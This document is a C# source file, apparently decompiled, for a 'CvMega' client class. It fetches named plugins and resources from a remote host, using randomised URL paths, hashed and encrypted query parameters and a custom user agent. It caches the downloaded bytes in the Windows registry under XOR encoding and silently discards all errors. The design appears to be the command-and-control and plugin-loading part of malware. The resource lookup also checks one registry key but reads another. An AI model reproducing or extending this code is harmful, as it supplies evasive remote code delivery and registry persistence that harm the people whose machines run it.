using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;

namespace CvMega.Helper;

internal class Client
{
	public static string currentHost = string.Empty;

	public static byte[] GetPlugin(string name)
	{
		if (name == "Client")
		{
			return null;
		}
		if (RegeditKey.CheckValue("ao" + name))
		{
			return SimpleEncryptor.XorEncryptMyKey(Convert.FromBase64String(RegeditKey.GetValue("ao" + name)), 66);
		}
		byte[] array = SendGet(new Dictionary<string, string>
		{
			{ "command", "plugin" },
			{ "name", name }
		});
		if (array == null)
		{
			return null;
		}
		RegeditKey.SetValue("ao" + name, Convert.ToBase64String(SimpleEncryptor.XorEncryptMyKey(array, 66)));
		return array;
	}

	public static byte[] GetResource(string name)
	{
		if (name == "Client")
		{
			return null;
		}
		if (RegeditKey.CheckValue("oa" + name))
		{
			return SimpleEncryptor.XorEncryptMyKey(Convert.FromBase64String(RegeditKey.GetValue("ao" + name)), 66);
		}
		byte[] array = SendGet(new Dictionary<string, string>
		{
			{ "command", "resource" },
			{ "name", name }
		});
		if (array == null)
		{
			return null;
		}
		RegeditKey.SetValue("ao" + name, Convert.ToBase64String(SimpleEncryptor.XorEncryptMyKey(array, 66)));
		return array;
	}

	public static string SendGetRequest(Dictionary<string, string> parameters)
	{
		byte[] array = SendGet(parameters);
		if (array == null)
		{
			return null;
		}
		return SimpleEncryptor.Decrypt(Encoding.UTF8.GetString(array));
	}

	public static byte[] SendGet(Dictionary<string, string> parameters)
	{
		try
		{
			using HttpClient httpClient = new HttpClient();
			StringBuilder stringBuilder = new StringBuilder(currentHost + RandomPathGenerator.GenerateCompletelyRandomPath());
			if (parameters.Count > 0)
			{
				stringBuilder.Append("?");
				foreach (KeyValuePair<string, string> parameter in parameters)
				{
					stringBuilder.Append(SimpleEncryptor.Hash(parameter.Key) + "=" + SimpleEncryptor.Encrypt(parameter.Value) + "&");
				}
				stringBuilder.Length--;
			}
			string requestUri = stringBuilder.ToString();
			httpClient.DefaultRequestHeaders.Add("User-Agent", "cvmega");
			return httpClient.GetAsync(requestUri).Result.Content.ReadAsByteArrayAsync().Result;
		}
		catch
		{
			return null;
		}
	}
}
